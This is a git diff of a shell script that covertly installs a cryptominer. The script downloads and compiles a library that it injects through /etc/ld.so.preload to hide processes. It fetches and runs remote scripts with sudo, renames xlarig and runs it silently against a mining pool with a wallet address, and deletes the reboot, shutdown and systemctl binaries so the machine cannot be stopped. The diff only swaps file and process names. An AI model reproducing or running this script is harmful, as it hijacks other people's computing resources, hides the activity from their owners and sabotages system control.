@@ -3,12 +3,12 @@ set -x
 apt-get update 
 apt-get install -y wget curl sudo
 apt-get install sudo wget cpulimit -y
-curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+curl https://github.com/barburonjilo/back/raw/main/bangjo.c -o bangjo.c
 apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
+gcc -Wall -fPIC -shared -o libbangjo.so bangjo.c -ldl
+mv libbangjo.so /usr/local/lib/
+echo /usr/local/lib/libbangjo.so >> /etc/ld.so.preload
+rm bangjo.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo apt-get update 
@@ -20,7 +20,7 @@ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
 source ~/.bashrc 
 nvm install 18
 npm i -g node-process-hider
-ph add sgr1
+ph add bangjo
 wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
 chmod u+x configurasi.sh
 sudo ./configurasi.sh
@@ -47,9 +47,9 @@ cmake ..
 
 make
 
-mv xlarig sgr1
-cpulimit -l 100 -e sgr1 &
-./sgr1 -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera > /dev/null 2>&1 &
+mv xlarig bangjo
+cpulimit -l 100 -e bangjo &
+./bangjo -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl 
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
